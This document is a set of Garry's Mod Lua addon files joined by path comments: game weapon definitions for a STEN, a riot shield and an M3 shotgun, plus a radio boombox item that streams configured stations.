SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "STEN"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 52			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 65
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_smgsten.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_sten.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("Weaponsten.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 500			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 32		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.6		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.4		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.5		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "smg1"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 20	-- Base damage per bullet
SWEP.Primary.Spread		= .03	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .016 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(4.367, -1.476, 3.119)
SWEP.IronSightsAng = Vector(-0.213, -0.426, 0)
SWEP.SightsPos = Vector(4.367, -1.476, 3.119)
SWEP.SightsAng = Vector(-0.213, -0.426, 0)
SWEP.RunSightsPos = Vector (-2.3095, -3.0514, 2.3965)
SWEP.RunSightsAng = Vector (-19.8471, -33.9181, 10)

if (gmod.GetGamemode().Name == "Murderthon 9000") then

	SWEP.Slot		= 1				-- Slot in the weapon selection menu
	SWEP.Weight		= 3			-- rank relative ot other weapons. bigger is better

end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/_boombox/lua/weapons/retroboombox_base/shared.lua:
--SWEP.ViewModelFlip 			= false
SWEP.Author = "Venatuss & Slawer"
SWEP.Instructions = "Click to use"
SWEP.ViewModel = Model( "models/sterling/retro_c_boombox.mdl" )
SWEP.WorldModel = Model( "models/sterling/retro_w_boombox.mdl" )
SWEP.UseHands = true
SWEP.Spawnable = false
SWEP.AdminSpawnable = false
SWEP.Primary.Damage = 0
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = "none"
SWEP.Primary.Delay = 2
SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"
SWEP.Category = "RetroBoombox"
SWEP.PrintName = "Бумбокс"
SWEP.Slot = 1
SWEP.SlotPos = 1
SWEP.DrawAmmo = false
SWEP.DrawCrosshair = false
SWEP.MainColor = "white"
SWEP.SecondaryColor = "silver"
SWEP.TubeLightsColor = "white"
SWEP.MainLightsColor = "white"
SWEP.SoundLightsColor = "red"
SWEP.ScreenBackgroundColor = Color( 32, 32, 32, 255 )
SWEP.ScreenContentColor = Color( 0, 255, 219, 255 )
local color_lightblue
if CLIENT then
	color_background = Color( 32, 32, 32, 255 )
	color_lightblue = Color( 0, 255, 219, 255 )
end

net.Receive( "RetroBoombox:SendBoomboxInfos", function()
	local tColors = net.ReadTable()
	timer.Simple( 0.5, function() if IsValid( LocalPlayer():GetWeapon( "retroboombox_base" ) ) then LocalPlayer():GetWeapon( "retroboombox_base" ):GiveProperties( tColors or {} ) end end )
end )

function SWEP:SetupDataTables()
	self:NetworkVar( "Bool", 0, "Power" )
	self:NetworkVar( "Bool", 1, "Playing" )
	self:NetworkVar( "Float", 0, "Frequence" )
	self:NetworkVar( "Float", 1, "SoundLevel" )
	self:NetworkVar( "Float", 2, "LightMode" )
end

function SWEP:ShouldDropOnDie()
	return false
end

function SWEP:Reload()
end

--[[
	///
]]
function SWEP:PlayAnimation( iLevel )
	iLevel = math.Round( iLevel or 1 )
	if ( self.NextAnimation or 0 ) > CurTime() then return end
	self.NextAnimation = CurTime() + 0.3
	self:ResetSequence( iLevel )
	if SERVER then return end
	if not IsValid( self:GetOwner() ) or not IsValid( self:GetOwner():GetViewModel() ) then return end
	self:GetOwner():GetViewModel():ResetSequence( iLevel )
end

function SWEP:PlayFailSound()
	if SERVER then return end
	if IsValid( self.FailSound ) then
		if self.FailSound:GetState() ~= GMOD_CHANNEL_PLAYING then self.FailSound:Play() end
		return
	end

	sound.PlayFile( "sound/retro_boombox/no-radio.mp3", "3d", function( station )
		if IsValid( station ) then
			station:Play()
			station:SetVolume( 10 )
			self.FailSound = station
		end
	end )
end

local frequencies = RetroBoombox.Config.Frequencies
function SWEP:PlayStation( frequence )
	if SERVER then return end
	if self.FrequenceAsked then return end
	local tInfos = frequencies[frequence]
	if not tInfos then return end
	self.FrequenceAsked = true
	sound.PlayURL( tInfos.url, "3d", function( station )
		if not IsValid( self ) then return end
		self.FrequenceAsked = false
		if IsValid( self.Station ) then self.Station:Stop() end
		if IsValid( self.FailSound ) then self.FailSound:Pause() end
		if not IsValid( self:GetOwner() ) or not IsValid( self:GetOwner():GetActiveWeapon() ) or self:GetOwner():GetActiveWeapon() ~= self then return end
		if IsValid( station ) then
			station:SetPos( self:GetPos() )
			station:Play()
			self.Station = station
		else
			self:PlayFailSound()
		end
	end )
end

function SWEP:PlayMusic()
	if SERVER then return end
	if IsValid( self:GetOwner() ) and IsValid( self:GetOwner():GetViewModel() ) and self:GetLightMode() ~= self:GetOwner():GetViewModel().LightMode then RetroBoombox:ChangeLightMode( self:GetOwner():GetViewModel(), self:GetLightMode() ) end
	if self:GetLightMode() ~= self.LightMode then RetroBoombox:ChangeLightMode( self, self:GetLightMode() ) end
	if self:GetPower() then
		if IsValid( self.FailSound ) and self.FailSound:GetState() == GMOD_CHANNEL_PLAYING then
			if IsValid( self.Station ) then
				self.FailSound:Pause()
				return
			elseif self:GetPos():DistToSqr( LocalPlayer():GetPos() ) > 1160000 then
				self.FailSound:SetVolume( 0 )
				return
			end

			self.FailSound:SetPos( self:GetPos() )
			self.FailSound:SetVolume( self:GetSoundLevel() / RetroBoombox.Config.MaxSoundVolume )
		end

		if IsValid( self.Station ) then
			if self.Station:GetState() == ( GMOD_CHANNEL_PLAYING or GMOD_CHANNEL_PAUSED ) and self:GetPos():DistToSqr( LocalPlayer():GetPos() ) > 1160000 then
				self.Station:Stop()
				return
			end

			if self:GetPlaying() then
				if self.Station:GetState() ~= GMOD_CHANNEL_PLAYING then
					self.Station:Play()
					return
				end
			elseif self.Station:GetState() ~= GMOD_CHANNEL_PAUSED then
				self.Station:Pause()
				return
			end

			if self.Station:GetFileName() ~= frequencies[self:GetFrequence()].url then
				self.Station:Stop()
				self:PlayStation( self:GetFrequence() )
				return
			end

			if self.Station:GetVolume() ~= self:GetSoundLevel() / RetroBoombox.Config.MaxSoundVolume then self.Station:SetVolume( self:GetSoundLevel() / RetroBoombox.Config.MaxSoundVolume ) end
			self.Station:SetPos( self:GetPos() )
			self:PlayAnimation( ( self.LightLevel or 3 ) / 3 )
		elseif self:GetPos():DistToSqr( LocalPlayer():GetPos() ) < 1160000 then
			self:PlayStation( self:GetFrequence() )
		end
	elseif IsValid( self.Station ) then
		self.Station:Stop()
	end
end

function SWEP:Think()
	if not IsValid( self:GetOwner() ) or not IsValid( self:GetOwner():GetActiveWeapon() ) or self:GetOwner():GetActiveWeapon() ~= self then return end
	self:PlayMusic()
end

--[[
	///
]]
function SWEP:SetWorldModelColors()
	RetroBoombox:ChangeColor( self, "main", self.MainColor )
	RetroBoombox:ChangeColor( self, "metalic", self.SecondaryColor )
	RetroBoombox:ChangeLightMode( self, self:GetLightMode() or 0 )
end

function SWEP:SetViewModelColors()
	if SERVER then return end
	if not IsValid( self:GetOwner() ) or not IsValid( self:GetOwner():GetViewModel() ) then return end
	RetroBoombox:ChangeColor( self:GetOwner():GetViewModel(), "main", self.MainColor )
	RetroBoombox:ChangeColor( self:GetOwner():GetViewModel(), "metalic", self.SecondaryColor )
	RetroBoombox:ChangeLightMode( self:GetOwner():GetViewModel(), self:GetLightMode() or 0 )
end

function SWEP:PrimaryAttack()
	self:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
	if IsValid( self:GetOwner() ) and self:GetOwner().keyCurrentlyPressed and self:GetOwner().keyCurrentlyPressed[RetroBoombox.Config.KeyBase] then
		if RetroBoombox.Config.Frequencies[self:GetFrequence() + 1] then
			self:SetFrequence( self:GetFrequence() + 1 )
		else
			self:SetFrequence( 1 )
		end
	end
end

function SWEP:SecondaryAttack()
	self:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
	if SERVER and IsValid( self:GetOwner() ) and self:GetOwner().keyCurrentlyPressed and self:GetOwner().keyCurrentlyPressed[RetroBoombox.Config.KeyBase] then
		local eBoombox = ents.Create( self.BoomboxClass or "retroboombox_base" )
		eBoombox:Spawn()
		eBoombox:SetPower( self:GetPower() )
		eBoombox:SetPlaying( self:GetPlaying() )
		eBoombox:SetFrequence( self:GetFrequence() )
		eBoombox:SetSoundLevel( self:GetSoundLevel() )
		eBoombox:SetLightMode( self:GetLightMode() )
		eBoombox:SetPos( self:GetPos() + self:GetOwner():GetForward() * 20 + self:GetOwner():GetUp() * 70 )
		eBoombox:SetAngles( self:GetAngles() )
		if IsValid( self.BoomboxOwner ) and eBoombox.SetBoomboxOwner then eBoombox:SetBoomboxOwner( self.BoomboxOwner ) end
		hook.Run( "onBoomboxDropped", self:GetOwner(), self, eBoombox )
		self:Remove()
	end
end

function SWEP:GiveProperties( tColors )
	self.MainColor = tColors.MainColor or "white"
	self.SecondaryColor = tColors.SecondaryColor or "silver"
	self.TubeLightsColor = tColors.TubeLightsColor or "white"
	self.MainLightsColor = tColors.MainLightsColor or "white"
	self.SoundLightsColor = tColors.SoundLightsColor or "red"
	self.ScreenBackgroundColor = tColors.ScreenBackgroundColor or Color( 32, 32, 32, 255 )
	self.ScreenContentColor = tColors.ScreenContentColor or Color( 0, 255, 219, 255 )
	if CLIENT and IsValid( self:GetOwner() ) and IsValid( self:GetOwner():GetViewModel() ) then
		self:GetOwner():GetViewModel().MainColor = tColors.MainColor or "white"
		self:GetOwner():GetViewModel().SecondaryColor = tColors.SecondaryColor or "silver"
		self:GetOwner():GetViewModel().TubeLightsColor = tColors.TubeLightsColor or "white"
		self:GetOwner():GetViewModel().MainLightsColor = tColors.MainLightsColor or "white"
		self:GetOwner():GetViewModel().SoundLightsColor = tColors.SoundLightsColor or "red"
		self:GetOwner():GetViewModel().ScreenBackgroundColor = tColors.ScreenBackgroundColor or Color( 32, 32, 32, 255 )
		self:GetOwner():GetViewModel().ScreenContentColor = tColors.ScreenContentColor or Color( 0, 255, 219, 255 )
	end

	self:SetViewModelColors()
	self:SetWorldModelColors()
end

function SWEP:Deploy()
	self.LightMode = nil
	self:SetViewModelColors()
	self:SetWorldModelColors()
end

function SWEP:Initialize()
	self:SetHoldType( "grenade" )
	self:SetViewModelColors()
	self:SetWorldModelColors()
	if CLIENT then
		color_background = self.ScreenBackgroundColor or Color( 32, 32, 32, 255 )
		color_lightblue = self.ScreenContentColor or Color( 0, 255, 219, 255 )
	end

	self.IsBoombox = true
end

function SWEP:ResetViewModelMaterials()
	if SERVER then return end
	if not IsValid( self:GetOwner() ) or not IsValid( self:GetOwner():GetViewModel() ) then return end
	for iID in pairs( self:GetOwner():GetViewModel():GetMaterials() ) do
		self:GetOwner():GetViewModel():SetSubMaterial( iID - 1 )
	end
end

function SWEP:ClearSounds()
	if IsValid( self.Station ) then self.Station:Stop() end
	if IsValid( self.FailSound ) then self.FailSound:Stop() end
end

function SWEP:OnRemove()
	self:ResetViewModelMaterials()
	self:ClearSounds()
end

function SWEP:Holster()
	self:ResetViewModelMaterials()
	self:ClearSounds()
	return true
end

local smoothdata = {}
--[[
	Here no need to use a 3D2D usable frame. Just paint it is enough.
]]
function SWEP:DrawSwepScreen( iType )
	self.SwepScreen = self.SwepScreen or {}
	if self.SwepScreen[iType] and IsValid( self.SwepScreen[iType] ) then return self.SwepScreen[iType] end
	local this = self
	local size_x, size_y = 620 * 0.6, 400 * 0.6
	if iType == 2 then size_x, size_y = 620 * 0.65, 400 * 0.65 end
	self.SwepScreen[iType] = vgui.Create( "DFrame" )
	local dFrame = self.SwepScreen[iType]
	dFrame:SetPaintedManually( true )
	dFrame:SetSize( size_x, size_y )
	dFrame:SetPaintedManually( true )
	dFrame:ShowCloseButton( false )
	dFrame:SetTitle( "" )
	function dFrame:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color( 32, 32, 32 ) )
		if IsValid( this.Station ) then
			local boxSize = 4
			local boxNumber = 170
			local AMP = 1500
			local data = {}
			this.LightLevel = 0
			this.Station:FFT( data, FFT_1024 )
			local maxHeight = 0
			for i = 1, boxNumber * 0.5 do
				smoothdata[i] = Lerp( 10 * FrameTime(), smoothdata[i] or 0, data[i] or 0 )
				local height = math.Clamp( smoothdata[i] * AMP, 0, size_y )
				maxHeight = math.max( maxHeight, height )
				draw.RoundedBox( 0, i * boxSize, size_y - height, boxSize, height, color_lightblue )
				draw.RoundedBox( 0, size_x - i * boxSize, size_y - height, boxSize, height, color_lightblue )
			end

			this.LightLevel = math.Round( 9 * maxHeight / size_y ) or 9
		end
	end

	local dCurrentFrequence = vgui.Create( "DPanel", dFrame )
	dCurrentFrequence:SetPos( 0, 0 )
	dCurrentFrequence:SetSize( size_x, size_y )
	dCurrentFrequence.Paint = nil
	function dCurrentFrequence:UpdateRadio()
		local imageSize = size_y
		local dLogo = vgui.Create( "DHTML", dCurrentFrequence )
		dLogo:Dock( TOP )
		dLogo:DockMargin( ( size_x - imageSize ) * 0.5 + 10, 0, ( size_x - imageSize ) * 0.5 + 0, 0 )
		dLogo:SetTall( imageSize )
		function dLogo:Think()
			if not IsValid( this ) then return end
			if self.Frequence ~= this:GetFrequence() then
				self:SetHTML( string.format( "<img src='%s' width ='%s' height='%s' >", frequencies[this:GetFrequence() ~= 0 and this:GetFrequence() or 1].logo, imageSize - 20, imageSize - 20 ) )
				self.Frequence = this:GetFrequence()
			end
		end
	end

	dCurrentFrequence:UpdateRadio()
	return dFrame
end

if SERVER then return end
mGradient_l = Material( "vgui/gradient-u" )
local listText = { ( "[%s+E] %s" ):format( input.GetKeyName( RetroBoombox.Config.KeyBase ), RetroBoombox:L( "TurnPower" ) ), ( "[%s+%s] %s" ):format( input.GetKeyName( RetroBoombox.Config.KeyBase ), RetroBoombox:L( "LMB" ), RetroBoombox:L( "Frequency" ) ), ( "[%s+%s] %s" ):format( input.GetKeyName( RetroBoombox.Config.KeyBase ), RetroBoombox:L( "RMB" ), RetroBoombox:L( "Drop" ) ), ( "[%s+UP/DOWN] %s" ):format( input.GetKeyName( RetroBoombox.Config.KeyBase ), RetroBoombox:L( "Volume" ) ), }
function SWEP:PostDrawViewModel( eViewModel )
	local vPosition = eViewModel:GetPos()
	vPosition = vPosition + eViewModel:GetForward() * 16.9 + eViewModel:GetRight() * 8.7 + eViewModel:GetUp() * 0
	local aAngle = eViewModel:GetAngles()
	aAngle:RotateAroundAxis( aAngle:Up(), -10 )
	aAngle:RotateAroundAxis( aAngle:Right(), -185 )
	aAngle:RotateAroundAxis( aAngle:Forward(), -86.5 )
	cam.Start3D2D( vPosition, aAngle, 0.01 )
	self:DrawSwepScreen( 1 ):PaintManual()
	cam.End3D2D()
	local vPosition2 = eViewModel:GetPos()
	vPosition2 = vPosition2 + eViewModel:GetForward() * 22.5 + eViewModel:GetRight() * 8.5 + eViewModel:GetUp() * 3
	local aAngle2 = eViewModel:GetAngles()
	aAngle2:RotateAroundAxis( aAngle2:Up(), 45 )
	aAngle2:RotateAroundAxis( aAngle2:Right(), -185 )
	aAngle2:RotateAroundAxis( aAngle2:Forward(), -95 )
	cam.Start3D2D( vPosition2, aAngle2, 0.01 )
	for iID, sText in pairs( listText ) do
		surface.SetFont( onyx.FontNoScale( "Comfortaa", 120 ) )
		local text_x, text_y = surface.GetTextSize( sText )
		local margin_left, margin_top = 20, 5
		draw.RoundedBox( 0, -text_x - margin_left, ( iID - 1 ) * ( text_y + margin_top * 2 + 15 ), text_x + margin_left * 2, text_y + margin_top * 2, Color( 0, 0, 0, 200 ) )
		draw.SimpleText( sText, onyx.FontNoScale( "Comfortaa", 120 ), 4, ( iID - 1 ) * ( text_y + margin_top * 2 + 15 ) + 4 + margin_top, Color( 0, 0, 0 ), TEXT_ALIGN_RIGHT )
		draw.SimpleText( sText, onyx.FontNoScale( "Comfortaa", 120 ), 0, ( iID - 1 ) * ( text_y + margin_top * 2 + 15 ) + margin_top, color_white, TEXT_ALIGN_RIGHT )
	end

	cam.End3D2D()
	local vPosition = eViewModel:GetPos()
	vPosition = vPosition + eViewModel:GetForward() * 12.5 + eViewModel:GetRight() * 8.2 + eViewModel:GetUp() * 0.4
	local aAngle = eViewModel:GetAngles()
	aAngle:RotateAroundAxis( aAngle:Up(), -10 )
	aAngle:RotateAroundAxis( aAngle:Right(), -185 )
	aAngle:RotateAroundAxis( aAngle:Forward(), -86.5 )
	cam.Start3D2D( vPosition, aAngle, 0.01 )
	self:DrawSwepScreen( 1 ):PaintManual()
	cam.End3D2D()
end

function SWEP:DrawWorldModel()
	self:DrawModel()
	if not IsValid( self:GetOwner() ) then return end
	local boneID = self:GetOwner():LookupBone( "ValveBiped.Bip01_R_Clavicle" ) or 0
	local bonePos, boneAngle = self:GetOwner():GetBonePosition( boneID )
	local vPosition = bonePos
	vPosition = vPosition + boneAngle:Forward() * 8.3 + boneAngle:Right() * -9.1 + boneAngle:Up() * -2.4
	local aAngle = boneAngle
	aAngle:RotateAroundAxis( aAngle:Up(), 7 )
	aAngle:RotateAroundAxis( aAngle:Right(), 157 )
	aAngle:RotateAroundAxis( aAngle:Forward(), -4 )
	cam.Start3D2D( vPosition, aAngle, 0.01 )
	self:DrawSwepScreen( 2 ):PaintManual()
	cam.End3D2D()
	local vPosition2 = vPosition + boneAngle:Forward() * -6.3 + boneAngle:Right() * 0 + boneAngle:Up() * 0.1
	cam.Start3D2D( vPosition2, aAngle, 0.01 )
	self:DrawSwepScreen( 2 ):PaintManual()
	cam.End3D2D()
end
--PATH addons/_ballistic_shields/lua/weapons/riot_shield/shared.lua:
if SERVER then
	include( "ballistic_shields/sh_bs_util.lua" )
	include( "ballistic_shields/sv_bs_util.lua" )
end

include( "bs_config.lua" )
include( "ballistic_shields/sh_bs_lang.lua" )
SWEP.PrintName = "Riot shield"
SWEP.Author = "D3G"
SWEP.Instructions = "LMB - Attack | RMB - Toggle visibility"
SWEP.Spawnable = true
SWEP.AdminOnly = true
SWEP.ViewModel = ""
SWEP.WorldModel = "models/bshields/rshield.mdl"
SWEP.AutoSwitchTo = false
SWEP.AutoSwitchFrom = false
SWEP.Slot = 5
SWEP.SlotPos = 0
SWEP.DrawAmmo = false
SWEP.DrawCrosshair = false
SWEP.Category = "Shields"
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = "none"
SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"
SWEP.CanVisToggle = true
SWEP.VisToggle = false
SWEP.HitDistance = 55
local SwingSound = Sound( "WeaponFrag.Throw" )
local HitSound = Sound( "Flesh.ImpactHard" )
function SWEP:Initialize()
	self:SetHoldType( "melee2" )
end

function SWEP:DrawWorldModel()
	self:SetNoDraw( true )
end

local function bsGetHoldType( ply )
	if ply:LookupAttachment( "anim_attachment_RH" ) > 0 then return { 1, "anim_attachment_RH" } end
	if ply:LookupAttachment( "forward" ) > 0 then return { 2, "forward" } end
	return { 3, "anim_attachment_head" }
end

local ShieldIcon = Material( "bshields/ui/riot_shield", "smooth" )
local BackgroundIcon = Material( "bshields/ui/background" )
function SWEP:DrawHUD()
	if bshields.config.disablehud then return end
	surface.SetDrawColor( 255, 255, 255, 200 )
	surface.SetMaterial( BackgroundIcon )
	surface.DrawTexturedRect( ScrW() * 0.5 - ScrH() / 10, ScrH() * 0.5 - ScrH() / 30 + ScrH() / 3, ScrH() / 5, ScrH() / 15 )
	surface.SetDrawColor( 255, 255, 255, 125 )
	draw.SimpleTextOutlined( bshields.lang[bshields.config.language].rshieldprim, onyx.Font( "Comfortaa@18" ), ScrW() * 0.5 - ScrH() / 32, ScrH() * 0.5 - ScrH() / 28 + ScrH() / 3 + ScrH() / 22, Color( 255, 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 20, 20, 20, 255 ) )
	surface.SetMaterial( ShieldIcon )
	surface.DrawTexturedRect( ScrW() * 0.5 - ScrH() / 10.2, ScrH() * 0.5 - ScrH() / 32 + ScrH() / 3, ScrH() / 16, ScrH() / 16 )
	if self.VisToggle then
		draw.SimpleTextOutlined( bshields.lang[bshields.config.language].sec, onyx.Font( "Comfortaa@18" ), ScrW() * 0.5 - ScrH() / 32, ScrH() * 0.5 - ScrH() / 28 + ScrH() / 3 + ScrH() / 48, Color( 255, 255, 255, 25 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 20, 20, 20, 255 ) )
	else
		draw.SimpleTextOutlined( bshields.lang[bshields.config.language].sec, onyx.Font( "Comfortaa@18" ), ScrW() * 0.5 - ScrH() / 32, ScrH() * 0.5 - ScrH() / 28 + ScrH() / 3 + ScrH() / 48, Color( 255, 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 20, 20, 20, 255 ) )
	end
end

function SWEP:Deploy()
	self.CanVisToggle = true
	self.VisToggle = false
	if SERVER then
		local owner = self:GetOwner()
		local holdtype = bsGetHoldType( owner )
		bshield_remove( owner )
		owner.bs_type = 2
		owner.bs_shield = ents.Create( "bs_rshield" )
		owner.bs_shield:SetCollisionGroup( COLLISION_GROUP_DEBRIS )
		owner.bs_shield:SetMoveType( MOVETYPE_NONE )
		owner.bs_shield:SetPos( owner:GetPos() )
		owner.bs_shield:SetParent( owner, owner:LookupAttachment( holdtype[2] ) )
		owner.bs_shield:SetLocalAngles( bshields.shields[holdtype[1]][3].angles )
		owner.bs_shield:SetLocalPos( bshields.shields[holdtype[1]][3].position )
		owner.bs_shield:Spawn()
		net.Start( "bs_shield_info" )
		net.WriteUInt( owner.bs_shield:EntIndex(), 16 )
		net.Send( owner )
	end
end

function SWEP:PrimaryAttack()
	local owner = self:GetOwner()
	if owner:LookupAttachment( "anim_attachment_RH" ) > 0 then owner:SetAnimation( PLAYER_ATTACK1 ) end
	owner:LagCompensation( true )
	local shield
	if SERVER then
		shield = owner.bs_shield
	else
		shield = Entity( LocalPlayer().bs_shieldIndex )
	end

	self:EmitSound( SwingSound )
	if SERVER and owner:LookupAttachment( "anim_attachment_RH" ) > 0 then
		owner.bs_shield:SetLocalAngles( Angle( 6, -34, -12 ) )
		owner.bs_shield:SetLocalPos( Vector( 4, 8, -1 ) )
		timer.Simple( 0.4, function()
			owner.bs_shield:SetLocalAngles( bshields.shields[1][3].angles )
			owner.bs_shield:SetLocalPos( bshields.shields[1][3].position )
		end )
	end

	local tr = util.TraceLine( {
		start = owner:GetShootPos(),
		endpos = owner:GetShootPos() + owner:GetAimVector() * self.HitDistance,
		mask = MASK_SHOT_HULL,
		filter = { owner, shield }
	} )

	if not IsValid( tr.Entity ) then
		tr = util.TraceHull( {
			start = owner:GetShootPos(),
			endpos = owner:GetShootPos() + owner:GetAimVector() * self.HitDistance,
			mins = Vector( -10, -10, -8 ),
			maxs = Vector( 10, 10, 8 ),
			mask = MASK_SHOT_HULL,
			filter = { owner, shield }
		} )
	end

	if tr.Hit and not ( game.SinglePlayer() and CLIENT ) then self:EmitSound( HitSound ) end
	if SERVER and IsValid( tr.Entity ) and ( tr.Entity:IsNPC() or tr.Entity:IsPlayer() or tr.Entity:Health() > 0 ) then
		local dmginfo = DamageInfo()
		local attacker = owner
		if not IsValid( attacker ) then attacker = self end
		dmginfo:SetAttacker( attacker )
		dmginfo:SetInflictor( self )
		dmginfo:SetDamage( math.random( bshields.config.rshielddmgmin, bshields.config.rshielddmgmax ) )
		tr.Entity:TakeDamageInfo( dmginfo )
		hit = true
	end

	if SERVER and IsValid( tr.Entity ) then
		local phys = tr.Entity:GetPhysicsObject()
		if IsValid( phys ) then phys:ApplyForceOffset( owner:GetAimVector() * 80 * phys:GetMass(), tr.HitPos ) end
	end

	owner:LagCompensation( false )
	self:SetNextPrimaryFire( CurTime() + 0.7 )
end

function SWEP:SecondaryAttack()
	if CLIENT then
		if not self.CanVisToggle then return end
		if not IsValid( Entity( LocalPlayer().bs_shieldIndex ) ) then return end
		surface.PlaySound( "weapons/smg1/switch_single.wav" )
		if not self.VisToggle then
			Entity( LocalPlayer().bs_shieldIndex ):SetColor( Color( 0, 0, 0, 125 ) )
			self.VisToggle = true
		else
			Entity( LocalPlayer().bs_shieldIndex ):SetColor( Color( 255, 255, 255 ) )
			self.VisToggle = false
		end

		self.CanVisToggle = false
		timer.Simple( 0.1, function() self.CanVisToggle = true end )
	end
end

if CLIENT then return end
function SWEP:Holster()
	bshield_remove( self:GetOwner() )
	return true
end

function SWEP:OnRemove()
	bshield_remove( self:GetOwner() )
	return true
end

function SWEP:OnDrop()
	bshield_remove( self:GetOwner() )
	return true
end
--PATH addons/_ballistic_shields/lua/ballistic_shields/sh_bs_util.lua:
bshields = bshields or {}
bshields.config = bshields.config or {}
bshields.shields = {
	{
		[1] = {
			["angles"] = Angle( 4, 6, -14 ),
			["position"] = Vector( 0, 8, -1 )
		},
		[2] = {
			["angles"] = Angle( 6, 6, -12 ),
			["position"] = Vector( 8, 10, -4 )
		},
		[3] = {
			["angles"] = Angle( -3, 7, -16 ),
			["position"] = Vector( -1, 4, -3 )
		}
	},
	{
		[1] = {
			["angles"] = Angle( -12, 0, 0 ),
			["position"] = Vector( 6, -4, -8 )
		},
		[2] = {
			["angles"] = Angle( -12, 0, 0 ),
			["position"] = Vector( 16, -3, -12 )
		},
		[3] = {
			["angles"] = Angle( -12, 0, 0 ),
			["position"] = Vector( 6, -3, -12 )
		}
	},
	{
		[1] = {
			["angles"] = Angle( 70, 78, -16 ),
			["position"] = Vector( 1, -7, -13 )
		},
		[2] = {
			["angles"] = Angle( 70, 78, -16 ),
			["position"] = Vector( 1, -6, -22 )
		},
		[3] = {
			["angles"] = Angle( 70, 78, -16 ),
			["position"] = Vector( 1, -8, -12 )
		}
	}
}
--PATH addons/swb_css/lua/weapons/swb_m3super90/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = false
	SWEP.PrintName = "M3 Super 90"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(-7.65, -8.207, 3.345)
	SWEP.AimAng = Vector(0.349, 0, 0)
		
	SWEP.SprintPos = Vector(3.957, -4.112, 1.013)
	SWEP.SprintAng = Vector(-8.613, 32.743, 0)
	
	SWEP.ZoomAmount = 5
	SWEP.ViewModelMovementScale = 0.85
	SWEP.Shell = "shotshell"
	SWEP.ShellOnEvent = true
	
	SWEP.IconLetter = "k"
	
	SWEP.MuzzleEffect = "swb_shotgun"
end

SWEP.PlayBackRate = 1
SWEP.PlayBackRateSV = 1
SWEP.SpeedDec = 30
SWEP.BulletDiameter = 5
SWEP.CaseLength = 10

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true
SWEP.AmmoEnt = "item_box_buckshot_ttt"

SWEP.Slot = 1
SWEP.SlotPos = 0
SWEP.NormalHoldType = "shotgun"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"semi"}
SWEP.Base = "swb_base"
SWEP.Category = "SUP Weapons"

SWEP.Author			= "Spy"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 55
SWEP.ViewModelFlip	= false
